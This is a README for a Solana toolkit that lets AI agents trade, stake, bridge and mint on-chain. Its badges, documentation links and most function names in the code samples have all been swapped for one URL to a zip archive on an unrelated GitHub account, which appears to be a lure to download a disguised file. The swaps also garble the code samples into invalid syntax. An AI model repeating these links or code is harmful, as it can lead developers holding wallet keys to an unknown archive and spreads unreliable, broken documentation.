<div align="center">

# Solana Agent Kit

![SAKCover2](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)

![NPM Downloads](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)
![GitHub forks](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)
![GitHub License](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)

</div>

An open-source toolkit for connecting AI agents to Solana protocols. Now, any agent, using any model can autonomously perform 60+ Solana actions:

- Trade tokens
- Launch new tokens
- Lend assets
- Send compressed airdrops
- Execute blinks
- Launch tokens on AMMs
- Bridge tokens across chains
- And more...

Anyone - whether an SF-based AI researcher or a crypto-native builder - can bring their AI agents trained with any model and seamlessly integrate with Solana.

[![Run on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)
> Replit template created by [Arpit Singh](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)

## 🔧 Core Blockchain Features

- **Token Operations**
  - Deploy SPL tokens by Metaplex
  - Transfer assets
  - Balance checks
  - Stake SOL
  - Zk compressed Airdrop by Light Protocol and Helius
  - Bridge tokens across chains using Wormhole
- **NFTs on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip**
  - Create your own collection
  - NFT creation and automatic listing on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip
  - List your NFT for sale in any SPL token
- **NFT Management via Metaplex**
  - Collection deployment
  - NFT minting
  - Metadata management
  - Royalty configuration

- **DeFi Integration**
  - Jupiter Exchange swaps
  - Launch on Pump via PumpPortal
  - Raydium pool creation (CPMM, CLMM, AMMv4)
  - Orca Whirlpool integration
  - Manifest market creation, and limit orders
  - Meteora Dynamic AMM, DLMM Pool, and Alpha Vault
  - Openbook market creation
  - Register and Resolve SNS
  - Jito Bundles
  - Pyth Price feeds for fetching Asset Prices
  - Register/resolve Alldomains
  - Perpetuals Trading with Adrena Protocol
  - Drift Vaults, Perps, Lending and Borrowing
  - Cross-chain bridging via deBridge DLN
  - Cross chain bridging via Wormhole

- **Solana Blinks**
   - Lending by Lulo (Best APR for USDC)
   - Send Arcade Games
   - JupSOL staking
   - Solayer SOL (sSOL)staking

- **Non-Financial Actions**
  - Gib Work for registering bounties

- **Market Data Integration**
  - CoinGecko Pro API integration
  - Real-time token price data
  - Trending tokens and pools
  - Top gainers analysis
  - Token information lookup
  - Latest pool tracking

## 🤖 AI Integration Features

- **LangChain Integration**
  - Ready-to-use LangChain tools for blockchain operations
  - Autonomous agent support with React framework
  - Memory management for persistent interactions
  - Streaming responses for real-time feedback

- **Vercel AI SDK Integration**
  - Vercel AI SDK for AI agent integration
  - Framework agnostic support
  - Quick and easy toolkit setup

- **Autonomous Modes**
  - Interactive chat mode for guided operations
  - Autonomous mode for independent agent actions
  - Configurable action intervals
  - Built-in error handling and recovery

- **AI Tools**
  - DALL-E integration for NFT artwork generation
  - Natural language processing for blockchain commands
  - Price feed integration for market analysis
  - Automated decision-making capabilities

## 📃 Documentation

You can view the full documentation of the kit at [https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)

## Why We Built V2 and Why Upgrade?

The Solana Agent Kit V2 is a major upgrade from V1, to learn why check out our [migration guide](./MIGRATING)

## 📦 Core Installation

```bash
npm install solana-agent-kit
```

## 📦 Plugin Installation

You can choose to install any of the plugins listed below or you could choose to install all of them to experience the full power of the Solana Agent Kit.

1. Token plugin (`@solana-agent-kit/plugin-token`): Token operations for SPL tokens such as transferring assets, swapping, bridging, and rug checking.
2. NFT plugin (`@solana-agent-kit/plugin-nft`): NFT operations for Metaplex NFTs such as minting, listing, and metadata management.
3. DeFi plugin (`@solana-agent-kit/plugin-defi`): DeFi operations for Solana protocols such as staking, lending, borrowing, and spot and perpetual trading.
4. Misc plugin (`@solana-agent-kit/plugin-misc`): Miscellaneous operations such as airdrops, price feeds, coingecko token information, and domain registration.
5. Blinks plugin (`@solana-agent-kit/plugin-blinks`): Blinks operations for Solana protocols such as arcade games and more soon to come.

```bash
npm install @solana-agent-kit/plugin-token @solana-agent-kit/plugin-nft @solana-agent-kit/plugin-defi @solana-agent-kit/plugin-misc @solana-agent-kit/plugin-blinks
```

## Quick Start

Initializing the wallet interface and agent with plugins:

```typescript
import { SolanaAgentKit, createVercelAITools, KeypairWallet } from "solana-agent-kit"; // or import createLangchainTools if using langchain
import TokenPlugin from "@solana-agent-kit/plugin-token";
import NFTPlugin from "@solana-agent-kit/plugin-nft";
import DefiPlugin from "@solana-agent-kit/plugin-defi";
import MiscPlugin from "@solana-agent-kit/plugin-misc";
import BlinksPlugin from "@solana-agent-kit/plugin-blinks";

const keyPair = https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("YOUR_SECRET_KEY"))
const wallet = new KeypairWallet(keyPair)

// Initialize with private key and optional RPC URL
const agent = new SolanaAgentKit(
  wallet,
  "YOUR_RPC_URL",
  {
    OPENAI_API_KEY: "YOUR_OPENAI_API_KEY",
  }
) // Add the plugins you would like to use
  .use(TokenPlugin)
  .use(NFTPlugin)
  .use(DefiPlugin)
  .use(MiscPlugin)
  .use(BlinksPlugin);

// Create LangChain tools
const tools = createVercelAITools(agent, https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip);
```

You can also make use of the wallet interface provided by the Solana wallet adapter for embedded wallets.

## Usage Examples Using Tools From The Token, Defi, and Other Plugins

### Deploy a New Token

```typescript
const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  "my ai token", // name
  "uri", // uri
  "token", // symbol
  9, // decimals
  {
    mintAuthority: null, // by default, deployer account
    freezeAuthority: null, // by default, deployer account
    updateAuthority: undefined, // by default, deployer account
    isMutable: false // by default, true
  },
  1000000 // initial supply
);

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Token Mint Address:", https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip());
```

### Deploy a New Token2022

```typescript
const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  "my ai token 2022", // name
  "uri", // uri
  "token2022", // symbol
  9, // decimals
  {
    mintAuthority: null, // by default, deployer account
    freezeAuthority: null, // by default, deployer account
    updateAuthority: undefined, // by default, deployer account
    isMutable: false // by default, true
  },
  1000000 // initial supply
);

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Token2022 Mint Address:", https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip());
```

### Create NFT Collection on 3Land
```typescript
const isDevnet = false; // (Optional) if not present TX takes place in Mainnet
const priorityFeeParam = 1000000; // (Optional) if not present the default priority fee will be 50000

 const collectionOpts: CreateCollectionOptions = {
    collectionName: "",
    collectionSymbol: "",
    collectionDescription: "",
    mainImageUrl: ""
  };

const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
      collectionOpts,
      isDevnet, // (Optional) if not present TX takes place in Mainnet
      priorityFeeParam, //(Optional)
    );
```

### Create NFT on 3Land

When creating an NFT using 3Land's tool, it automatically goes for sale on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip website

```typescript
const isDevnet = true; // (Optional) if not present TX takes place in Mainnet
const withPool = true; // (Optional) only present if NFT will be created with a Liquidity Pool for a specific SPL token
const priorityFeeParam = 1000000; // (Optional) if not present the default priority fee will be 50000
const collectionAccount = ""; //hash for the collection
const createItemOptions: CreateSingleOptions = {
  itemName: "",
  sellerFee: 500, //5%
  itemAmount: 100, //total items to be created
  itemSymbol: "",
  itemDescription: "",
  traits: [
    { trait_type: "", value: "" },
  ],
  price: 0, //100000000 == 0.1 sol, can be set to 0 for a free mint
  splHash: "", //present if listing is on a specific SPL token, if not present sale will be on $SOL, must be present if "withPool" is true
  poolName: "", // Only present if "withPool" is true
  mainImageUrl: "",
};
const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  {},
  collectionAccount,
  createItemOptions,
  isDevnet, // (Optional) if not present TX takes place in Mainnet
  withPool
  priorityFeeParam, //(Optional)
);
```

### Create NFT Collection

```typescript
const collection = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, {
  name: "My NFT Collection",
  uri: "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip",
  royaltyBasisPoints: 500, // 5%
  creators: [
    {
      address: "creator-wallet-address",
      percentage: 100,
    },
  ],
});
```

### Swap Tokens

```typescript
import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip";

const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  new PublicKey("target-token-mint"),
  100, // amount
  new PublicKey("source-token-mint"),
  300 // 3% slippage
);
```

### Lend Tokens

```typescript
import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip";

const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  100 // amount of USDC to lend
);
```

### Stake SOL

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  1 // amount in SOL to stake
);
```

### Stake SOL on Solayer

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  1 // amount in SOL to stake
);

```

### Send an SPL Token Airdrop via ZK Compression

```typescript
import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip";

(async () => {
  https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
    "~Airdrop cost estimate:",
    getAirdropCostEstimate(
      1000, // recipients
      30_000 // priority fee in lamports
    )
  );

  const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
    agent,
    new PublicKey("JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN"), // mint
    42, // amount per recipient
    9,
    [
      new PublicKey("1nc1nerator11111111111111111111111111111111"),
      // ... add more recipients
    ],
    30_000 // priority fee in lamports
  );
})();
```

### Fetch Price Data from Pyth

```typescript

const priceFeedID = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("SOL");

const price = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(priceFeedID);

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Price of SOL/USD:", price);
```

### Open PERP Trade

```typescript
import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip";

const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip({
  agent: agent,
  price: 300, // $300 SOL Max price
  collateralAmount: 10, // 10 jitoSOL in
  collateralMint: new PublicKey("J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn"), // jitoSOL
  leverage: 50000, // x5
  tradeMint: new PublicKey("J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn"), // jitoSOL
  slippage: 0.3, // 0.3%
});
```

### Close PERP Trade

```typescript
import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip";

const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip({
  agent: agent,
  price: 200, // $200 SOL price
  tradeMint: new PublicKey("J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn"), // jitoSOL
});
```

### Close Empty Token Accounts

``` typescript

const { signature } = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent);
```

### Create a Drift account

Create a drift account with an initial token deposit.

```typescript
const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  // amount of token to deposit
  100,
  // token symbol to deposit
  "USDC"
)
```

### Create a Drift Vault

Create a drift vault.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, {
  name: "my-drift-vault",
  marketName: "USDC-SPOT",
  redeemPeriod: 1, // in days
  maxTokens: 100000, // in token units e.g 100000 USDC
  minDepositAmount: 5, // in token units e.g 5 USDC
  managementFee: 1, // 1%
  profitShare: 10, // 10%
  hurdleRate: 5, // 5%
  permissioned: false, // public vault or whitelist
})
```

### Deposit into a Drift Vault

Deposit tokens into a drift vault.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, 100, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
```

### Deposit into your Drift account

Deposit tokens into your drift account.

```typescript
const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, 100, "USDC")
```

### Derive a Drift Vault address

Derive a drift vault address.

```typescript
const vaultPublicKey = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, "my-drift-vault")
```

### Do you have a Drift account

Check if agent has a drift account.

```typescript
const {hasAccount, account} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent)
```

### Get Drift account information

Get drift account information.

```typescript
const accountInfo = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent)
```

### Request withdrawal from Drift vault

Request withdrawal from drift vault.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, 100, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
```

### Carry out a perpetual trade using a Drift vault

Open a perpetual trade using a drift vault that is delegated to you.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, {
  vault: "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU",
  amount: 500,
  symbol: "SOL",
  action: "long",
  type: "limit",
  price: 180 // Please long limit order at $180/SOL
})
```

### Carry out a perpetual trade using your Drift account

Open a perpetual trade using your drift account.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, {
  amount: 500,
  symbol: "SOL",
  action: "long",
  type: "limit",
  price: 180 // Please long limit order at $180/SOL
})
```

### Update Drift vault parameters

Update drift vault parameters.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, {
  name: "my-drift-vault",
  marketName: "USDC-SPOT",
  redeemPeriod: 1, // in days
  maxTokens: 100000, // in token units e.g 100000 USDC
  minDepositAmount: 5, // in token units e.g 5 USDC
  managementFee: 1, // 1%
  profitShare: 10, // 10%
  hurdleRate: 5, // 5%
  permissioned: false, // public vault or whitelist
})
```

### Withdraw from Drift account

Withdraw tokens from your drift account.

```typescript
const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, 100, "USDC")
```

### Borrow from Drift

Borrow tokens from drift.

```typescript
const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, 1, "SOL", true)
```

### Repay Drift loan

Repay a loan from drift.

```typescript
const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, 1, "SOL", true)
```

### Withdraw from Drift vault

Withdraw tokens from a drift vault after the redemption period has elapsed.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent,  "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
```

### Update the address a Drift vault is delegated to

Update the address a drift vault is delegated to.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU", "new-address")
```

### Get Voltr Vault Position Values

Get the current position values and total value of assets in a Voltr vault.

```typescript
const values = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, "7opUkqYtxmQRriZvwZkPcg6LqmGjAh1RSEsVrdsGDx5K")
```

### Deposit into Voltr Strategy

Deposit assets into a specific strategy within a Voltr vault.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  new BN("1000000000"), // amount in base units (e.g., 1 USDC = 1000000)
  "7opUkqYtxmQRriZvwZkPcg6LqmGjAh1RSEsVrdsGDx5K", // vault
  "9ZQQYvr4x7AMqd6abVa1f5duGjti5wk1MHsX6hogPsLk"  // strategy
)
```

### Withdraw from Voltr Strategy

Withdraw assets from a specific strategy within a Voltr vault.

```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  agent,
  new BN("1000000000"), // amount in base units (e.g., 1 USDC = 1000000)
  "7opUkqYtxmQRriZvwZkPcg6LqmGjAh1RSEsVrdsGDx5K", // vault
  "9ZQQYvr4x7AMqd6abVa1f5duGjti5wk1MHsX6hogPsLk"  // strategy
)
```

### Get a Solana asset by its ID

```typescript
const asset = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(agent, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
```

### Get a price inference from Allora

Get the price for a given token and timeframe from Allora's API

```typescript
const sol5mPrice = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("SOL", "5m");
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("5m price inference of SOL/USD:", sol5mPrice);
```

### List all topics from Allora

```typescript
const topics = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip();
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Allora topics:", topics);
```

### Get an inference for an specific topic from Allora

```typescript
const inference = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(42);
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Allora inference for topic 42:", inference);
```

### Simulate a Switchboard feed

Simulate a given Switchboard feed. Find or create feeds [here](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip).

```typescript
const value = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
      "9wcBMATS8bGLQ2UcRuYjsRAD7TPqB1CMhqfueBx78Uj2", // TRUMP/USD
      "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip");;
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Simulation resulted in the following value:", value);

### Cross-Chain Bridge via deBridge

The Solana Agent Kit supports cross-chain token transfers using deBridge's DLN protocol. Here's how to use it:

1. Check supported chains:
```typescript
const chains = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip();
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Available chains:", chains);
// Example output: { chains: [{ chainId: "1", chainName: "Ethereum" }, { chainId: "7565164", chainName: "Solana" }] }
```

2. Get available tokens (optional):
```typescript
const tokens = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("1", "USDC"); // Search for USDC on Ethereum
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Available tokens:", tokens);
// Shows tokens matching 'USDC' on the specified chain
```

3. Create bridge order (SOL -> ETH):
```typescript
const orderInput = {
  srcChainId: "7565164", // Solana
  srcChainTokenIn: "11111111111111111111111111111111", // Native SOL
  srcChainTokenInAmount: "1000000000", // 1 SOL (9 decimals)
  dstChainId: "1", // Ethereum
  dstChainTokenOut: "0x0000000000000000000000000000000000000000", // ETH
  dstChainTokenOutRecipient: "0x23C279e58ddF1018C3B9D0C224534fA2a83fb1d2" // ETH recipient
};

const order = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(orderInput);
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Order created:", order);
// Contains transaction data and estimated amounts
```

4. Execute the bridge order:
```typescript
const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip);
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Bridge transaction sent:", signature);
```

5. Check bridge status:
```typescript
const status = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(signature);
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Bridge status:", status);
// Shows current status: Created, Fulfilled, etc.
```

Note: When bridging between chains:
- To Solana: Use base58 addresses for recipients and token mints
- From Solana: Use EVM addresses for recipients and ERC-20 format for tokens
- Always verify addresses and amounts before executing bridge transactions

### Get Token Price Data from CoinGecko

```typescript
const priceData = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip([
  "So11111111111111111111111111111111111111112", // SOL
  "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"  // USDC
]);
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Token prices:", priceData);
```

### Get Trending Tokens

```typescript
const trendingTokens = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip();
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Trending tokens:", trendingTokens);
```

### Get Latest Pools

```typescript
const latestPools = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip();
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Latest pools:", latestPools);
```

### Get Token Information

```typescript
const tokenInfo = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Token info:", tokenInfo);
```

### Get Top Gainers

```typescript
const topGainers = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("24h", "all");
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Top gainers:", topGainers);
```

### Get Trending Pools

```typescript
const trendingPools = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("24h");
https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("Trending pools:", trendingPools);
```

### Parse Instruction Data

```typescript
const parsedData = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  "<programId>",
  "<instructionData>" // base64
)

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("parsed data:", parsedData)
```

### Parse Instruction Data

```typescript
const parsedData = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  "<programId>",
  "<accountData>" // base64
)

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip("parsed data:", parsedData)
```

### Get Sanctum LST Price

```typescript
const prices = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip([
  "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",
  "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
  ])

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip('prices', prices)
```

### Get Sanctum LST APY

```typescript
const apys = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip([
  "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",
  "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
  ])

